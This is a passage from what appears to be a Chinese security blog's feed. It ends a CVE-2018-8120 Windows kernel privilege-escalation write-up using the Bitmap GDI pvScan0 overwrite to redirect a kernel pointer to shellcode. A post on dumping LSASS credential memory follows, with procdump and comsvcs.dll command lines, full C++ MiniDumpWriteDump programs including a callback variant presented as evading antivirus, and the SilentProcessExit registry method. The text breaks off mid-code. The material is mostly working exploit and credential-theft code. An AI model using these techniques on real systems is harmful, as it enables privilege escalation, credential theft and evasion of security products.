hBitHandle)</div><div class="line">&#123;</div><div class="line"><span class="attribute">DWORD</span> dwGdiCellArray = GetGdiCellArray();</div><div class="line"><span class="attribute">PGDICELL</span> pGdiCell = (PGDICELL)(dwGdiCellArray + LOWORD(hBitHandle) * sizeof(GDICELL));</div><div class="line"><span class="attribute">return</span> (PVOID)((DWORD)pGdiCell-&gt;pKernelAddress + 0x30);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第一：根据PEB+0x94的偏移确定GDICELL数组的首地址。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">DWORD</span> GetGdiCellArray()</div><div class="line">&#123;</div><div class="line">__asm</div><div class="line">&#123;</div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="built_in">fs</span>:[<span class="number">0x30</span>]// <span class="built_in">eax</span> = PEB</div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">eax</span> + <span class="number">0x94</span>]// <span class="built_in">eax</span> = GDICELL数组首地址</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二根据CreateBitmap返回的HBITMAP对象，以此作为索引确定<code>GDICELL</code>结构。<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PGDICELL pGdiCell = (<span class="name">PGDICELL</span>)(<span class="name">dwGdiCellArray</span> + LOWORD(<span class="name">hBitHandle</span>) * sizeof(GDICELL));</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第三，获取<code>GDICELL</code>对象的第一个成员<code>pKernelAddress</code>指向的SURFACE对象，在SURFACE对象的0x30偏移就是pvScan0指针。<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">return (<span class="name">PVOID</span>)((<span class="name">DWORD</span>)pGdiCell-&gt;pKernelAddress + <span class="number">0</span>x30)<span class="comment">;</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;现在我们知道了pvScan0指针，那么怎么利用漏洞修改pvScan0指针指向的内容呢？首先，创建两个Bitmap对象：Work以及Manager。并获取两个BitMap对象的pvScan0指针。分别记做workerpvScan0和managerpvScan0指针。<br>    <img src="http://hacky.wang/blog/20230208/lOt8aj5ylpt1.png?imageslim" alt="mark"></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//创建两个Bitmap对象</span></div><div class="line">hManger = CreateBitmap(<span class="number">0x60</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">32</span>, dwBuf);</div><div class="line">hWorker = CreateBitmap(<span class="number">0x60</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">32</span>, dwBuf);</div><div class="line">if (!hManger || !hWorker)</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"CreateBitmap error"</span>);</div><div class="line">return false;</div><div class="line">&#125;</div><div class="line"><span class="comment">//获取各自的pvScan0指针。</span></div><div class="line">mpv = GetPvScan(hManger);</div><div class="line">wpv = GetPvScan(hWorker);</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后通过任意地址覆写漏洞，改写pvScan0指针。将workerpvScan0指针覆写到managerpvScan0指针。<br>    <img src="http://hacky.wang/blog/20230208/CuJbWD2T5uSX.png?imageslim" alt="mark"><br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">////将wpv覆写入mpv，此时manage bitmap对象的pvScan0指针为worker bitmap对象的pvScan0指针。</span></div><div class="line">*(PDWORD)(<span class="number">0x2C</span>) = (DWORD)mpv;</div><div class="line">*(PDWORD)(<span class="number">0x14</span>) = (DWORD)wpv;</div><div class="line">DWORD szBuf[<span class="number">0x15C</span> / <span class="keyword">sizeof</span>(DWORD)] = &#123; <span class="number">0</span> &#125;;</div><div class="line"><span class="comment">// 指定要写入的内容</span></div><div class="line">szBuf[<span class="number">0</span>] = (DWORD)wpv;</div><div class="line"><span class="comment">// 触发漏洞</span></div><div class="line"><span class="keyword">if</span> (!CallNtUserSetImeInfoEx(szBuf))</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"CreateBitmap error"</span>);</div><div class="line"><span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着通过Set\GetBitmaps，修改\获取pvScan0指针指向的内容。即就是将ManageBitmap对象中的pvScan0指向的内存区域修改为pHalQuerySystemInformation地址，然后再将WorkerBitmap对象的pvScan0指向的内存区域修改为Shellcode地址<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 设置hManger的可修改地址为保存HalQuerySystemInformation函数地址的地址</span></div><div class="line">SetBitmapBits(hManger, sizeof(PVOID), <span class="meta">&amp;pHalQuerySystemInformation);  </span></div><div class="line"><span class="comment">// 将可修改地址中的值修改为ShellCode地址</span></div><div class="line">SetBitmapBits(hWorker, sizeof(PVOID), <span class="meta">&amp;ShellCode);</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这一部分可以这样理解，首先pvScan0指针指向的是一段内核区域，通过覆写漏洞，将workerpvScan0指向的地址覆盖到managerpvScan0指向的地址，然后先修改hManger的内核区域为HalQuerySystemInformation，接着修改hWorker的内核区域，也就是hManager的内核区域，也就是HalQuerySystemInformation地址为ShellCode地址。</p><h2 id="0x07-参考文献"><a href="#0x07-参考文献" class="headerlink" title="0x07 参考文献"></a>0x07 参考文献</h2><ul><li><a href="https://50u1w4y.github.io/site/HEVD/bitmap/#0x02-bitmap" target="_blank" rel="external">BitmapGDI技术</a></li><li><a href="https://bbs.kanxue.com/thread-272273.htm" target="_blank" rel="external">主要参照</a></li><li><a href="https://www.anquanke.com/post/id/247764" target="_blank" rel="external">BitmapGDI技术</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x1-漏洞描述&quot;&gt;&lt;a href=&quot;#0x1-漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;0x1 漏洞描述&quot;&gt;&lt;/a&gt;0x1 漏洞描述&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;CVE-2018-8120漏洞是一个位于win32k模块中的&lt;code&gt;SetImeInfoEx&lt;/code&gt;函数的任意地址覆盖漏洞，漏洞产生的根本原因是没有对&lt;code&gt;tagWINDOWSTATION&lt;/code&gt;结构的&lt;code&gt;spklList&lt;/code&gt;成员做有效性验证，就对其进行解引用，如果&lt;code&gt;spklList&lt;/code&gt;为NUll的话，继而对其进行解引用，导致漏洞触发。&lt;br&gt;
    
    </summary>
    
      <category term="Windows 内核提权漏洞" scheme="https://findream.github.io/categories/Windows-%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
    
    
  </entry>
  
  <entry>
    <title>Lsass Dump</title>
    <link href="https://findream.github.io/2022/12/30/Lsass%20Dump/"/>
    <id>https://findream.github.io/2022/12/30/Lsass Dump/</id>
    <published>2022-12-30T07:02:11.000Z</published>
    <updated>2022-12-31T11:46:23.640Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-现成工具"><a href="#0x01-现成工具" class="headerlink" title="0x01 现成工具"></a>0x01 现成工具</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;任务管理器</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;procdump:<code>procdump -ma lsass.exe lsass.dmp</code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Sharp dump:其核心也是使用<code>MiniDumpWriteDump</code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Out-MiniDump:是PowerSploit下的一个<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1" target="_blank" rel="external">转储组件</a>。同理也是使用<code>MiniDumpWriteDump</code></p><a id="more"></a><h2 id="0x02-本机API或者Dll"><a href="#0x02-本机API或者Dll" class="headerlink" title="0x02 本机API或者Dll"></a>0x02 本机API或者Dll</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;comsvcs.dll:管理员权限下使用<code>rundll32.exe comsvcs.dll MiniDump &lt;lsass PID&gt; &lt;out path&gt; full</code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;API就是转储最常见的<code>MiniDumpWriteDump</code>。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL <span class="title">ProcessMain</span><span class="params">(VOID)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="comment">//是否是管理员权限</span></div><div class="line"><span class="keyword">if</span> (IsElevated() == FALSE)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[!] IsElevated \r\n"</span>);</div><div class="line"><span class="keyword">return</span> FALSE;</div><div class="line">&#125;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+] run as Administor \n"</span>);</div><div class="line"><span class="comment">//启动Debug权限</span></div><div class="line">SetDebugPrivilege();</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+] set debug privilege \n"</span>);</div><div class="line">  <span class="comment">//获取LSASS进程Pid</span></div><div class="line">DWORD dwPid = GetLsassPid();</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+] get pid of lsass:%d\n"</span>, dwPid);</div><div class="line"><span class="comment">//打开进程获取句柄</span></div><div class="line">HANDLE hProcessOfLsass = OpenProcess(PROCESS_ALL_ACCESS, <span class="number">0</span>, dwPid);</div><div class="line"><span class="keyword">if</span> (hProcessOfLsass == <span class="literal">NULL</span>)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[!] OpenProcess \r\n"</span>);</div><div class="line"><span class="keyword">return</span> FALSE;</div><div class="line">&#125;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+] get handle of lsass \n"</span>);</div><div class="line"><span class="comment">//获取MiniDumpWriteDump函数地址</span></div><div class="line">pfnMiniDumpWriteDump MiniDumpWriteDump = (pfnMiniDumpWriteDump)GetProcAddress(</div><div class="line">LoadLibraryA(<span class="string">"Dbghelp.dll"</span>), <span class="string">"MiniDumpWriteDump"</span>);   <span class="comment">//</span></div><div class="line"><span class="keyword">if</span> (MiniDumpWriteDump == <span class="literal">NULL</span>)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[!] get address of mimidumpwritedump \n"</span>);</div><div class="line"><span class="keyword">return</span> FALSE;</div><div class="line">&#125;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+] get address of mimidumpwritedump \n"</span>);</div><div class="line">BOOL bResult = FALSE;</div><div class="line">HANDLE hFile = CreateFileW(<span class="string">L"c:\\dmplsass.bin"</span>, GENERIC_ALL, <span class="number">0</span>, <span class="literal">NULL</span>, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</div><div class="line"><span class="comment">//调用函数创建转储</span></div><div class="line">bResult = MiniDumpWriteDump(hProcessOfLsass, dwPid, hFile, MiniDumpWithFullMemory, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</div><div class="line"><span class="keyword">if</span> (bResult == FALSE)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[!] MiniDumpWriteDump \n"</span>);</div><div class="line">CloseHandle(hFile);</div><div class="line"><span class="keyword">return</span> FALSE;</div><div class="line">&#125;</div><div class="line"><span class="comment">//关闭文件句柄</span></div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+] mini dump write dump \n"</span>);</div><div class="line">CloseHandle(hFile);</div><div class="line"><span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;除了常规的直接使用<code>MiniDumpWriteDump</code>，现在很多C2都使用带有回调功能的<code>MiniDumpWriteDump</code>，因为<code>MiniDumpWriteDump</code>函数原型,函数第7个参数是一个指向<code>MINIDUMP_CALLBACK_INFORMATION</code>结构的指针，包含了回调函数的指针和参数。使用带回调功能的<code>MiniDumpWriteDump</code>并没有改写<code>MiniDumpWriteDump</code>函数，实现起来比较方便，也能过掉国内大多数AV。具体使用如下。<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL <span class="title">MiniDumpWriteDump</span>(<span class="params"></span></span></div><div class="line"><span class="function"><span class="params">  [<span class="keyword">in</span>] HANDLE                            hProcess,</span></span></div><div class="line"><span class="function"><span class="params">  [<span class="keyword">in</span>] DWORD                             ProcessId,</span></span></div><div class="line"><span class="function"><span class="params">  [<span class="keyword">in</span>] HANDLE                            hFile,</span></span></div><div class="line"><span class="function"><span class="params">  [<span class="keyword">in</span>] MINIDUMP_TYPE                     DumpType,</span></span></div><div class="line"><span class="function"><span class="params">  [<span class="keyword">in</span>] PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,</span></span></div><div class="line"><span class="function"><span class="params">  [<span class="keyword">in</span>] PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,</span></span></div><div class="line"><span class="function"><span class="params">  [<span class="keyword">in</span>] PMINIDUMP_CALLBACK_INFORMATION    CallbackParam</span></span></div><div class="line"><span class="function"><span class="params"></span>)</span>;</div></pre></td></tr></table></figure></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//回调函数</span></div><div class="line"><span class="function">BOOL CALLBACK <span class="title">minidumpCallback</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">__in     PVOID callbackParam,</span></span></div><div class="line"><span class="function"><span class="params">__in     <span class="keyword">const</span> PMINIDUMP_CALLBACK_INPUT callbackInput,</span></span></div><div class="line"><span class="function"><span class="params">__inout  PMINIDUMP_CALLBACK_OUTPUT callbackOutput</span></span></div><div class="line"><span class="function"><span class="params">)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">LPVOID destination = <span class="number">0</span>, source = <span class="number">0</span>;</div><div class="line">DWORD bufferSize = <span class="number">0</span>;</div><div class="line"><span class="keyword">switch</span> (callbackInput-&gt;CallbackType)</div><div class="line">&#123;</div><div class="line"><span class="keyword">case</span> IoStartCallback:</div><div class="line">callbackOutput-&gt;Status = S_FALSE;</div><div class="line"><span class="keyword">break</span>;</div><div class="line"><span class="keyword">case</span> IoWriteAllCallback:</div><div class="line">callbackOutput-&gt;Status = S_OK;</div><div class="line">source = callbackInput-&gt;Io.Buffer;</div><div class="line">destination = (LPVOID)((DWORD_PTR)buffer + (DWORD_PTR)callbackInput-&gt;Io.Offset);</div><div class="line">bufferSize = callbackInput-&gt;Io.BufferBytes;</div><div class="line">bytesRead += bufferSize;</div><div class="line">RtlCopyMemory(destination, source, bufferSize);</div><div class="line"><span class="keyword">break</span>;</div><div class="line"><span class="keyword">case</span> IoFinishCallback:</div><div class="line">callbackOutput-&gt;Status = S_OK;</div><div class="line"><span class="keyword">break</span>;</div><div class="line"><span class="keyword">default</span>:</div><div class="line"><span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">if</span> (IsElevated() == FALSE)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[!] IsElevated \r\n"</span>);</div><div class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+] run as Administor \n"</span>);</div><div class="line">SetDebugPrivilege();</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+] set debug privilege \n"</span>);</div><div class="line">DWORD dwPid = GetLsassPid();</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+] get pid of lsass:%d\n"</span>, dwPid);</div><div class="line">HANDLE hProcessOfLsass = OpenProcess(PROCESS_ALL_ACCESS, <span class="number">0</span>, dwPid);</div><div class="line"><span class="keyword">if</span> (hProcessOfLsass == <span class="literal">NULL</span>)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[!] OpenProcess \r\n"</span>);</div><div class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+] get handle of lsass \n"</span>);</div><div class="line"><span class="comment">//初始化MINIDUMP_CALLBACK_INFORMATION</span></div><div class="line">MINIDUMP_CALLBACK_INFORMATION callbackInfo;</div><div class="line">ZeroMemory(&amp;callbackInfo, <span class="keyword">sizeof</span>(MINIDUMP_CALLBACK_INFORMATION));</div><div class="line">callbackInfo.CallbackRoutine = &amp;minidumpCallback;</div><div class="line">callbackInfo.CallbackParam = <span class="literal">NULL</span>;</div><div class="line">pfnMiniDumpWriteDump MiniDumpWriteDump = (pfnMiniDumpWriteDump)GetProcAddress(</div><div class="line">LoadLibraryA(<span class="string">"Dbghelp.dll"</span>), <span class="string">"MiniDumpWriteDump"</span>);   </div><div class="line"><span class="keyword">if</span> (MiniDumpWriteDump == <span class="literal">NULL</span>)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[!] get address of mimidumpwritedump \n"</span>);</div><div class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+] get address of mimidumpwritedump \n"</span>);</div><div class="line">BOOL bResult = FALSE;</div><div class="line">bResult = MiniDumpWriteDump(hProcessOfLsass, dwPid, <span class="literal">NULL</span>, MiniDumpWithFullMemory, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;callbackInfo);</div><div class="line"><span class="keyword">if</span> (bResult == TRUE)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+] mini dump write dump \n"</span>);</div><div class="line"><span class="keyword">long</span> <span class="keyword">int</span> size = bytesRead;</div><div class="line"><span class="keyword">char</span> *securitySth = <span class="keyword">new</span> <span class="keyword">char</span>[size];</div><div class="line"><span class="built_in">memcpy</span>(securitySth, buffer, bytesRead);</div><div class="line">DWORD bytesWritten = <span class="number">0</span>;</div><div class="line">HANDLE outFile = CreateFileW(<span class="string">L"dmplsass.bin"</span>, GENERIC_ALL, <span class="number">0</span>, <span class="literal">NULL</span>, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</div><div class="line"><span class="keyword">if</span> (outFile != <span class="literal">NULL</span>)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+] create dump file \n"</span>);</div><div class="line">WriteFile(outFile, securitySth, bytesRead, &amp;bytesWritten, <span class="literal">NULL</span>);</div><div class="line">CloseHandle(outFile);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[!] mimi dump %x\n"</span>, GetLastError());</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="0x03-RtlReportSilentProcessExit静默进程退出"><a href="#0x03-RtlReportSilentProcessExit静默进程退出" class="headerlink" title="0x03 RtlReportSilentProcessExit静默进程退出"></a>0x03 RtlReportSilentProcessExit静默进程退出</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://www.deepinstinct.com/blog/lsass-memory-dumps-are-stealthier-than-ever-before-part-2" target="_blank" rel="external">LSASS Memory Dumps are Stealthier than Ever Before - Part 2</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当进程被终止的时候，它会调用ntdll.dll的<code>RtlReportSilentProcessExit()</code>,然后与Windows 错误报告服务(<code>WerSvcGroup</code>下的<code>WerSvc</code>)通讯,然后WER服务将启动<code>WerFault.exe</code>，它将执行退出进程的转储。有趣的是，<code>调用此API不会导致进程退出</code>。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Silent Process Exit是从windows7中引入的一种机制，该机制在1)自身调用ExitProcess()自行终止，或者2)另一个进程通过TerminateProcess()终止时,为受监控进程触发指定的操作，目前支持的操作有三种：1）启动监控进程 2）显示弹出窗口 3）创建转储文件</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用Silent Process Exit机制需要设置注册表项目。1）在<code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\&lt;process.exe&gt;</code>的<code>GlobalFlag</code>键设置为<code>FLG_MONITOR_SILENT_PROCESS_EXIT (0x200)</code> 2)在<code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\&lt;process.exe&gt;</code>项下设置三个属性<br><figure class="highlight haml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">-<span class="ruby">DumpType           <span class="number">0x02</span>        dump内存的类型</span></div><div class="line"><span class="ruby">-LocalDumpFolder    <span class="symbol">c:</span>\temp     这是dump后保存的地址</span></div><div class="line"><span class="ruby">-ReportingMode      <span class="number">0x02</span>        退出执行的操作</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关于<code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\&lt;process.exe&gt;</code>项目下三个属性更为详细的介绍如下<br><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">ReportingMode</span> (REG_DWORD) 需要执行的操作</div><div class="line">* <span class="selector-tag">LAUNCH_MONITORPROCESS</span> (<span class="number">0</span>x1) – 启动一个监控进程</div><div class="line">* <span class="selector-tag">LOCAL_DUMP</span> (<span class="number">0</span>x2) – 为导致终止的进程和被终止的进程创建转储文件</div><div class="line">* <span class="selector-tag">NOTIFICATION</span> (<span class="number">0</span>x4) – 显示弹出通知</div><div class="line"><span class="selector-tag">LocalDumpFolder</span>(REG_SZ) 转储文件保存的路径</div><div class="line"><span class="selector-tag">DumpType</span>(REG_DWORD)转储文件类型</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<a href="https://forum.butian.net/share/887" target="_blank" rel="external">静默退出 DUMP LSASS.EXE</a>一文中有详细的代码介绍。在装了卡巴斯基的环境中，因为卡巴对于LSASS Dump的保护机制，第三方进程很难对LSASS进程进行转储，可以考虑利用注入的方式进行转储，或者使用文章中的RemoteCreateThread方法进行转储。但是此时可能又要准备绕过卡巴对于注入的监控。<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> main() </div><div class="line">&#123;</div><div class="line">PCWCHAR targetProcName = L<span class="string">"lsass.exe"</span>;</div><div class="line">DWORD pid = -<span class="number">1</span>;</div><div class="line">HMODULE hNtMod = NULL;</div><div class="line">fRtlReportSilentProcessExit fnRtlReportSilentProcessExit = NULL;</div><div class="line">HANDLE hLsassProc = NULL;</div><div class="line">NTSTATUS ntStatus = -<span class="number">1</span>;</div><div class="line"><span class="keyword">if</span> (!EnableDebugPriv()) &#123;</div><div class="line"><span class="keyword">printf</span>(<span class="string">" [!] EnableDebugPriv: %X\n"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">printf</span>(<span class="string">"[+] EnableDebugPriv OK\n"</span>);</div><div class="line"><span class="keyword">if</span> (!setRelatedRegs(targetProcName)) &#123;</div><div class="line"><span class="keyword">printf</span>(<span class="string">"[!] setRelatedRegs: %X\n"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">printf</span>(<span class="string">"[+] setRelatedRegs OK\n"</span>);</div><div class="line">pid = getPidByName(targetProcName);</div><div class="line"><span class="keyword">if</span> (-<span class="number">1</span> == pid) &#123;</div><div class="line"><span class="keyword">printf</span>(<span class="string">"[!] getPidByName: %#X\n"</span>, pid);</div><div class="line"><span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">printf</span>(<span class="string">"+] getPidByName: %X\n"</span>, pid);</div><div class="line"><span class="keyword">do</span></div><div class="line">&#123;</div><div class="line">hNtMod = GetModuleHandleW(L<span class="string">"ntdll.dll"</span>);</div><div class="line"><span class="keyword">if</span> (!hNtMod) &#123;</div><div class="line"><span class="keyword">printf</span>(<span 